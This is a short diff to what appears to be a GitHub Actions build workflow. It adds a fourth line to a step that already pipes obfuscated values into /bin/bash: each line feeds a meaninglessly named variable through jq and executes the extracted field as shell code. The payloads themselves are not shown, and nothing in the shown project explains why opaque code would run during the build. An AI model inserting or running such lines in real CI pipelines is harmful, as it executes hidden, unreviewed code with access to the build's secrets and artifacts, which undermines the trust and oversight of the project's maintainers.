@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$spufp4" | jq -r .ib3244 | /bin/bash
           echo $byxv4915 | jq -r .z797 | /bin/bash
           echo $swh9 | jq -r .gxfbh2 | /bin/bash
+          printf '%s' "$zb5915" | jq -r .ptmef69970 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
